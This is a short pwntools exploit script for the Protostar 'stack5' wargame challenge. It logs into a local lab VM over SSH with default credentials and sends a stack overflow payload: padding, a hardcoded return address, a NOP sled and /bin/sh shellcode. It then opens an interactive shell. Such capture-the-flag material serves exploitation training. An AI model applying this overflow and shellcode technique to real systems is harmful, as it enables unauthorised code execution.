from pwn import *



r = ssh(host='192.168.160.128', user='user', password='user')



shellcode=b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80'
payload=b'A'*76 + p32(0xbffff7dc) + asm('nop')*70 + shellcode

print(payload)
lauch_pg= r.run(["/opt/protostar/bin/stack5"])

lauch_pg.sendline(payload)


lauch_pg.interactive()

